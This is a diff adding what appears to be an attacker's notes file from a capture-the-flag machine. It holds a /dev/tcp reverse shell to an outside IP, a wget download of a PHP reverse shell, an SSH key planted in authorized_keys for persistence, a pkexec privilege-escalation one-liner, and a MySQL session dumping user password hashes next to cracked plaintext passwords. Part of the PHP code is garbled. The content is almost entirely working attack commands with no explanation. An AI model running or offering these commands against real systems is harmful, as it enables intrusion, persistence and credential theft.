@@ -1,0 +1,78 @@
+exec 5<>/dev/tcp/10.6.78.155/9000 && cat <&5 | while read line; do $line 2>&5 >&5; done
+
+if(isset($_POST['command'])) $store = explode(" ",$cmd); 
+$blacklist = array('nc', 'python', 'bash','php','perl','rm','cat','head','tail','python3','more','less','sh','ls'); 
+for($i=0; $iAre you a hacker?
+
+/home/apaar/.helpline.sh
+
+wget -O /tmp/revshell.php http://10.6.78.155:8000/revshell.php
+
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDiB8c46dDpIM6KiEOnZ+grMkZLCNholSJjkzzM75sDnP9MDcVgdri9YXcM6DfvOgXFbNZeTJWhJb8Cqx5lLvpWW3MiLda/lgJiqPBbpqV6fpzs+6Qp0sy+3V12gzdoonIF/+TmlrQmzffm3O3XmFUV1ZG16S+W2CjD7Oms4PbxZDjFF3QPE8f0xbDclpizWFMDzFvLprGvGcuQ6OGyakooQY5SpX3/z02bci7vAs/H6IVGhRPfHyPzhleCq2yiNnyY+dRMUi9c0KRz42TIlv0nnDJfpTR/wOUek1OfvylkNYe2/Rp2NSNNzjHHPJ9VycC9nS9d8a95JiTbFoPuIlw73FwOvQ+pkmtT857VD6/R+9OOJxrBA0b1bv1qpsE4HgYyXPe1vxH6RaWlNjgUuaNzNjAh7dcKtcX/98RxInKkqbv0l9COcNEFvOmes2FUmO5Qgengsg18gcwyKt6cHi1B0Me3+iGlwHWjyy+4TlDaAcdPZIMrEfhRuH+udTRuFA8= user@example.com" >> /home/apaar/.ssh/authorized_keys
+
+ssh -L 9001:127.0.0.1:9001 apaar@10.10.168.235
+
+
+
+Aurick -    7e53614ced3640d5de23f111806cc4fd:masterpassword
+cullapaar - 686216240e5af30df0501e53c789a649:dontaskdonttell
+
+
+export EVIL_COMMAND="id; /bin/bash -i >& /dev/tcp/10.6.78.155/9000 0>&1"
+pkexec --user root /bin/bash -c "$EVIL_COMMAND"
+
+
+
+
+
+apaar@ubuntu:~$ mysql -u root -p
+Enter password: 
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 2
+Server version: 5.7.31-0ubuntu0.18.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> show db;
+ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'db' at line 1
+mysql> show dbs;
+ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'dbs' at line 1
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| webportal          |
++--------------------+
+5 rows in set (0.01 sec)
+
+mysql> use webportal;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
++---------------------+
+| Tables_in_webportal |
++---------------------+
+| users               |
++---------------------+
+1 row in set (0.00 sec)
+
+mysql> select * from users;
++----+-----------+----------+-----------+----------------------------------+
+| id | firstname | lastname | username  | password                         |
++----+-----------+----------+-----------+----------------------------------+
+|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd |
+|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |
++----+-----------+----------+-----------+----------------------------------+
+2 rows in set (0.00 sec)
